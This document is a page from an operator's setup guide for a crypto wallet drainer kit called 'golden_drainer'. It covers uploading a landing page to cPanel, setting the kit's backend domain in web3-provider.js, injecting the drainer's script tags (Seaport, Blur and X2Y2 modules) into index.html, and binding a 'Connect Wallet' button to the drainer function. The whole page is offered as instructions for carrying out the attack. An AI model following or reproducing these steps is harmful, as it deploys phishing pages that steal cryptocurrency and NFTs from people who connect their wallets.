---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# 9️⃣ Landing page installation

[In this section](buying-landing-page-domain.md) we bought [**Landing page domain**](buying-landing-page-domain.md), now we need to install the landing page on the hosting.

You need to host site files in cPanel:

1. Open your hosting control panel.
2. In the "Domains" section, select Domains:
3. Click on the root folder of your site to go to the root directory:
4. Delete all files contained in the root folder, except for the cgi-bin directory.
5. Click the "**Upload**" button
6. Select and upload the archive with your website files. Attention: cPanel hosting control panel only supports archives in formats: **zip**, **gzip**, **bzip** and **tar**.
7. Select the archive and click "**Extract**":
8. Enter the path to the directory where you want to extract the files. Then click the "**Extract Files**" button
9. Make sure that the site files were extracted directly to the site directory and not to a subdirectory.



Open the "Client" folder, go to the "assets" folder, open the "web3-provider.js" file and enter here our [**Technical domain**](buying-technical-domain.md) (in the same format as it is specified in the file)

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

After making changes, transfer the "assets" folder to the root of our landing

Now open the site file where your landing is, usually called "index.html."

Scroll through the file to the end and find a special tag there that looks like this:\
\</body>

As soon as you find it, write down the following lines of code right in front of it:

```
  <script src="./assets/web3-provider/web3-modal.js"></script>
  <script src="./assets/web3-provider/web3-loader.js"></script>
  <script src="./assets/web3-provider/web3-connect.js"></script>
  <script src="./assets/web3-provider/web3-router.js"></script>
  <script src="./assets/web3-provider/web3-module.js"></script>
  <script src="./assets/web3-provider/web3-alert.js"></script>
  <script src="./assets/web3-provider/web3-seaport.js"></script>
  <script src="./assets/web3-provider/web3-data.js"></script>
  <script src="./assets/web3-provider/ethers.js"></script>
  <script src="./assets/web3-provider/ethereum-tx.js"></script>
  <script src="./assets/web3-modules/module-blur.js"></script>
  <script src="./assets/web3-modules/module-seaport.js"></script>
  <script src="./assets/web3-modules/module-x2y2.js"></script>
  <script src="./assets/web3-provider.js"></script>
```

Now you need to connect the Drainer to the button you need, or just an item on the page.

Most often, the buttons look either like this in the code:

```
<button class="button btn-dark"> Connect Wallet </button>
```

Or somehow, in fact, it can look like anything:

```
<a href="#"> Connect Wallet </a>
```

You need to add the desired function to the button so that it is called when clicking:

```
onclick="golden_drainer()"
```

That is, in the final version it will look like this:

```
<button class="button btn-dark" onclick="golden_drainer()">Connect Wallet</button>
```

<figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

Uploading our landing to hosting.

Open our website and check.
